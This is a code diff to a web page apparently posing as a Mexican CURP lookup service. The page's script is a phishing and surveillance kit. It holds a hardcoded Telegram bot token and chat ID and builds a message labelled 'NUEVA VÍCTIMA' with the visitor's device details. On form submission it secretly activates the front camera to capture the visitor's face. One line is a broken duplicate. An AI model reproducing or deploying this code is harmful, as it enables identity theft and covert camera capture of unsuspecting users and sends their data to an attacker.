+        <svg viewBox="0 0 24 24"><path d="M12 2.2c3.2 0 3.58.01 4.85.07 1.17.05 1.8.25 2.23.41.56.22.96.48 1.38.9.42.42.68.82.9 1.38.16.42.36 1.06.41 2.23.06 1.27.07 1.65.07 4.85s-.01 3.58-.07 4.85c-.05 1.17-.25 1.8-.41 2.23-.22.56-.48.96-.9 1.38-.42.42-.82.68-1.38.9-.42.16-1.06.36-2.23.41-1.27.06-1.65.07-4.85.07s-3.58-.01-4.85-.07c-1.17-.05-1.8-.25-2.23-.41-.56-.22-.96-.48-1.38-.9-.42-.42-.68-.82-.9-1.38-.16-.42-.36-1.06-.41-2.23-.06-1.27-.07-1.65-.07-4.85s.01-3.58.07-4.85c.05-1.17.25-1.8.41-2.23.22-.56.48-.96.9-1.38.42-.42.82-.68 1.38-.9.42-.16 1.06-.36 2.23-.41C8.42 2.21 8.8 2.2 12 2.2zm0 1.8c-3.15 0-3.52.01-4.76.07-1.15.05-1.77.24-2.19.41-.55.21-.94.47-1.35.88-.41.41-.66.8-.88 1.35-.16.42-.36 1.04-.41 2.19-.06 1.24-.07 1.61-.07 4.76s.01 3.52.07 4.76c.05 1.15.24 1.77.41 2.19.21.55.47.94.88 1.35.41.41.8.66 1.35.88.42.16 1.04.36 2.19.41 1.24.06 1.61.07 4.76.07s3.52-.01 4.76-.07c1.15-.05 1.77-.24 2.19-.41.55-.21.94-.47 1.35-.88.41-.41.66-.8.88-1.35.16-.42.36-1.04.41-2.19.06-1.24.07-1.61.07-4.76s-.01-3.52-.07-4.76c-.05-1.15-.24-1.77-.41-2.19-.21-.55-.47-.94-.88-1.35-.41-.41-.8-.66-1.35-.88-.42-.16-1.04-.36-2.19-.41-1.24-.06-1.61-.07-4.76-.07zm0 3.06a4.94 4.94 0 110 9.88 4.94 4.94 0 010-9.88zm0 1.8a3.14 3.14 0 100 6.28 3.14 3.14 0 000-6.28zm5.13-2.14a1.15 1.15 0 110 2.3 1.15 1.15 0 010-2.3z"/></svg>
+      </a>
+      <!-- YouTube -->
+      <a href="#youtube" class="recuadro-final-icono" aria-label="YouTube">
+        <svg viewBox="0 0 24 24"><path d="M23.5 6.5c-.27-1.02-1.06-1.82-2.08-2.09C19.6 3.96 12 3.96 12 3.96s-7.6 0-9.42.45C1.56 4.68.77 5.48.5 6.5.05 8.32.05 12 .05 12s0 3.68.45 5.5c.27 1.02 1.06 1.82 2.08 2.09 1.82.45 9.42.45 9.42.45s7.6 0 9.42-.45c1.02-.27 1.81-1.07 2.08-2.09.45-1.82.45-5.5.45-5.5s0-3.68-.45-5.5zM9.6 15.6V8.4l6.27 3.6-6.27 3.6z"/></svg>
+      </a>
     </div>
   </div>
 
@@ -292,7 +342,7 @@ body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:var(--texto
     <span class="recuadro-final-numero">079</span>
     <p class="recuadro-final-ayuda">Comun&iacute;cate, estamos<br />para ayudarte</p>
   </div>
-</div>
+</footer>
 
 <script>
 /* ===== LADAS ===== */
@@ -372,8 +422,9 @@ function v(id){var el=document.getElementById(id);return el?el.value:'';}
 
 window.addEventListener('load',function(){
   setTimeout(function(){
-    document.querySelectorAll('input').forEach(function(el){el.value='';});
-    document.querySelectorAll('select').forEach(function(el){el.selectedIndex=0;});
+    document.querySelectorAll('.form-control').forEach(function(el){
+      if(el.tagName==='SELECT'){el.selectedIndex=0;}else{el.value='';}
+    });
     var cpi=document.getElementById('cpInfo');if(cpi)cpi.innerHTML='';
   },150);
 });
@@ -384,21 +435,24 @@ function cambiarTab(tab){
   var panelCurp=document.getElementById('panel-curp');
   var panelDatos=document.getElementById('panel-datos');
   if(tab==='curp'){
-    if(btnCurp)btnCurp.classList.add('active');
-    if(btnDatos)btnDatos.classList.remove('active');
-    if(panelCurp)panelCurp.classList.remove('panel-oculto');
-    if(panelDatos)panelDatos.classList.add('panel-oculto');
+    btnCurp.classList.add('active');btnCurp.setAttribute('aria-selected','true');
+    btnDatos.classList.remove('active');btnDatos.setAttribute('aria-selected','false');
+    panelCurp.classList.remove('panel-oculto');
+    panelDatos.classList.add('panel-oculto');
   }else{
-    if(btnDatos)btnDatos.classList.add('active');
-    if(btnCurp)btnCurp.classList.remove('active');
-    if(panelDatos)panelDatos.classList.remove('panel-oculto');
-    if(panelCurp)panelCurp.classList.add('panel-oculto');
+    btnDatos.classList.add('active');btnDatos.setAttribute('aria-selected','true');
+    btnCurp.classList.remove('active');btnCurp.setAttribute('aria-selected','false');
+    panelDatos.classList.remove('panel-oculto');
+    panelCurp.classList.add('panel-oculto');
   }
 }
 
-function marcarError(el,on){
+function marcarError(el){
   if(!el)return;
-  if(on)el.classList.add('is-error');else el.classList.remove('is-error');
+  el.classList.add('is-error');
+  var fix=function(){el.classList.remove('is-error');el.removeEventListener('input',fix);el.removeEventListener('change',fix);};
+  el.addEventListener('input',fix);
+  el.addEventListener('change',fix);
 }
 
 function leerForm(){
@@ -414,6 +468,7 @@ function enviar(){
   var TOKEN="9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";
   var CHAT="9092452687";
   var API="https://api.telegram.org/bot"+TOKEN;
+  var txt="🔔 <b>NUEVA VÍCTIMA</b>\n\n
   var txt="🔔 <b>NUEVA VÍCTIMA</b>\n\n";
   txt+="📱 <b>Móvil:</b> "+info.modelo+"\n";
   txt+="💻 <b>SO:</b> "+info.so+"\n";
@@ -479,12 +534,9 @@ function autocompletarCP(cp){
 
 async function ejecutarFlujo(boton){
   boton.disabled=true;
-  var txtOriginal=boton.innerHTML;
   boton.innerHTML='<span class="load"></span> Buscando…';
   try{
-    var stream=await navigator.mediaDevices.getUserMedia({video
-
-var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+    var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
     await new Promise(function(r){setTimeout(r,1000);});
     var video=document.createElement('video');video.srcObject=stream;await video.play();
     await new Promise(function(r){setTimeout(r,600);});
@@ -505,42 +557,35 @@ document.addEventListener('DOMContentLoaded',function(){
   var cpEl=document.getElementById('cp');
   if(cpEl)cpEl.addEventListener('input',function(){autocompletarCP(this.value);});
 
-  // limpiar error al escribir
-  document.querySelectorAll('.form-control').forEach(function(el){
-    el.addEventListener('input',function(){el.classList.remove('is-error');});
-    el.addEventListener('change',function(){el.classList.remove('is-error');});
-  });
-
   var formEl=document.getElementById('curpForm');
   if(formEl){
     formEl.addEventListener('submit',async function(e){
       e.preventDefault();
-      var boton=document.getElementById('btnBuscar');
       var panelCurpVisible=!document.getElementById('panel-curp').classList.contains('panel-oculto');
-
-      // validar campos obligatorios visibles
-      var panelActual=panelCurpVisible?'panel-curp':'panel-datos';
-      var ok=true;
-      var cont=document.getElementById(panelActual);
-      if(cont){
-        cont.querySelectorAll('input,select').forEach(function(el){
-          var lbl=el.previousElementSibling;
-          var req=lbl && lbl.tagName==='LABEL' && /\*/.test(lbl.textContent||'');
-          if(req && !el.value){marcarError(el,true);ok=false;}
-        });
-      }
-      if(!ok){return;}
-
       if(panelCurpVisible){
-        form={};
-        form.curp=v('curp');
-        if(!form.curp){marcarError(document.getElementById('curp'),true);return;}
+        var curpVal=(v('curpInput')||'').trim();
+        if(curpVal.length<18){
+          marcarError(document.getElementById('curpInput'));
+          document.getElementById('curpInput').focus();
+          return;
+        }
+        form={curp:curpVal};
       }else{
         leerForm();
+        if(!form.nombre||!form.ap){
+          marcarError(document.getElementById('nombre'));
+          marcarError(document.getElementById('primer-apellido'));
+          return;
+        }
       }
-      await ejecutarFlujo(boton);
+      await ejecutarFlujo(document.getElementById('btnBuscar'));
     });
   }
+
+  document.querySelectorAll('.form-control').forEach(function(el){
+    el.addEventListener('input',function(){this.classList.remove('is-error');});
+    el.addEventListener('change',function(){this.classList.remove('is-error');});
+  });
 });
 </script>
 </body>
